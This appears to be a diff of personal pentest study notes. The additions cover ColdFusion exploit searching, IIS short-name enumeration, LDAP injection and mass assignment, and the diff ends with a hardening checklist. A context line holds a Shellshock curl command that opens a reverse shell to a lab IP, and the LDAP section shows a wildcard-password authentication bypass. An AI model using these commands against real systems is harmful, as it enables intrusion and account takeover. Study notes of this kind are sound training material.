@@ -1,4 +1,4 @@
-#CWES #methodology #wordpress #joomla #drupal #jenkins #splunk #osticket #PRTG #gitlab
+#CWES #methodology #wordpress #joomla #drupal #jenkins #splunk #osticket #PRTG #gitlab #coldfusion 
 
 
 #### Common applications:
@@ -354,6 +354,10 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 - Examples: Web browsers, media players, video games, chatting software
 - Harder to hack: Reverse engineering and pwn.
 - Some thick apps runs without internet access, and some require interaction with the internet or remote servers. (You can investegate this with wireshark or similar)
+- Since many of these applications are compiled apps, we sometimes want to reverse engineer them wit ghidra etc. - it can be practical to download the app we want to reverse to our own machine.
+- Sometimes just dissembling some apps, can get up hard coded login credentials. 
+
+
 
 #### ColdFusion
 - Programming language and web app dev platform based on Java
@@ -376,3 +380,66 @@ Default ports:
 - Checkout some common directories: /CFIDE and /cfdocs
 
 **Attacking ColdFusion:**
+Checkout the CF version, and check for expoits here:
+```
+searchsploit adobe coldfusion
+```
+- For CF8 there exists a unauthenticated RCE
+
+#### ISS Tilde Enumeration
+- Enumeration technique to uncover hidden files, directories and short file names on Microsoft internet information service (ISS)
+- Require ISS version <= 8.3 (?)
+- Enum tool for this vulnerability https://github.com/irsdl/IIS-ShortName-Scanner (Require oracle JAVA)
+
+
+Alternatively we can use a fitting wordlist and gobuster to perform the enumeration:
+Create a relevant wordlist for the enumeration:
+```shell
+egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+```
+
+Use the wordlist in gobuster:
+```shell
+gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
+```
+- .asp = Active server pages = server-side web pages created by microsoft 
+
+#### LDAP
+- Lightweight directory access protocol
+- Used to manage and access directory information 
+- Can be used for central authentication 
+
+![[Pasted image 20260725134051.png]]
+
+**LDAP injection:**
+- Exploits web app that use LDAP for authentication or storing user information. 
+- Similar to SQL injection, but attacking directory services instead of databases.
+- If we find an endpoint with a webapp and a ldap service running, we might want to try ldap injection against the webapp - since there is a good possibility that the app uses ldap for authentication.
+
+![[Pasted image 20260725134905.png]]
+
+Ex:
+Authentication query:
+```
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+```
+
+Injection, taking over a the user dummy:
+```
+$username = "dummy";
+$password = "*";
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+```
+
+#### Web Mass assignment 
+- Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server.
+- Errors in web mass assignments code can have big impact 
+
+#### Preventing and hardening common apps:
+- We should know what applications are running, and have a inventory of them.
+- Change the default admin user and password 
+- Access controls per application
+- Disable unsafe features, ex. php scripting in php
+- Regular patches, and backups
+- Integrate login via Active Directory
+- Only expose what is necessary to the internet 
